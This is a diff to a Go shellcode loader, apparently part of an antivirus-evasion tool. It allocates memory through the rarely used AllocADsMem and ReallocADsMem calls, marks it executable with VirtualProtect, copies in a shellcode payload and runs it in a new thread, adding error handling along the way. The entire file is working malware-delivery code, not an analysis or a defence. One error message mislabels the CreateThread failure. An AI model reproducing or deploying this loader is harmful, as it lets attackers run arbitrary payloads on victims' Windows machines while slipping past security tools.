@@ -1,36 +1,66 @@
 package loader
 
 import (
+	"fmt"
 	"unsafe"
-	"variant/wdll"
+	"variant/xwindows"
 
 	"golang.org/x/sys/windows"
 )
 
-func ADsMemLoad(shellcode []byte) {
+func ADsMem(shellcode []byte) error {
 	// AllocADsMem 分配一个可读可写但不可执行的内存块
-	ptrAlloc, _, _ := wdll.AllocADsMem().Call(uintptr(len(shellcode)))
+	ptrAlloc, allocErr := xwindows.AllocADsMem(uintptr(len(shellcode)))
+	if allocErr != nil && allocErr.Error() != "The operation completed successfully." {
+		return fmt.Errorf("AllocADsMem failed: %v", allocErr)
+	}
 
 	// ReallocADsMem 将AllocADsMem分配的内存块复制出来
-	ptrRealloc, _, _ := wdll.ReallocADsMem().Call(ptrAlloc, uintptr(len(shellcode)), uintptr(len(shellcode)))
+	ptrRealloc, reallocErr := xwindows.ReallocADsMem(
+		ptrAlloc,
+		uint32(len(shellcode)),
+		uint32(len(shellcode)),
+	)
+	if reallocErr != nil {
+		return fmt.Errorf("ReallocADsMem failed: %v", reallocErr)
+	}
 
 	// VirtualProtect 修改内存保护常量为可读可写可执行
 	var oldProtect uint32
-	wdll.VirtualProtect().Call(
+	_, vpErr := xwindows.VirtualProtect(
 		ptrRealloc,
 		uintptr(len(shellcode)),
-		0x40,
-		uintptr(unsafe.Pointer(&oldProtect)),
-		0,
-		0)
+		windows.PAGE_EXECUTE_READWRITE,
+		&oldProtect,
+	)
+	if vpErr != nil {
+		return fmt.Errorf("VirtualProtect failed: %v", vpErr)
+	}
 
-	wdll.RtlMoveMemory().Call(
-		ptrRealloc,
-		uintptr(unsafe.Pointer(&shellcode[0])),
+	rmErr := xwindows.RtlMoveMemory(
+		unsafe.Pointer(ptrRealloc),
+		unsafe.Pointer(&shellcode[0]),
 		uintptr(len(shellcode)),
 	)
+	if rmErr != nil {
+		return fmt.Errorf("RtlMoveMemory failed: %v", rmErr)
+	}
 
-	handle, _, _ := wdll.CreateThread().Call(0, 0, ptrRealloc, 0, 0, 0)
+	handle, ctErr := xwindows.CreateThread(
+		0,
+		0,
+		ptrRealloc,
+		0,
+		0,
+		0,
+	)
+	if ctErr != nil {
+		return fmt.Errorf("VirtualProtect failed: %v", ctErr)
+	}
 
-	wdll.WaitForSingleObject().Call(handle, windows.INFINITE)
+	_, wpErr := xwindows.WaitForSingleObject(handle, windows.INFINITE)
+	if wpErr != nil {
+		return fmt.Errorf("WaitForSingleObject failed: %v", wpErr)
+	}
+	return nil
 }
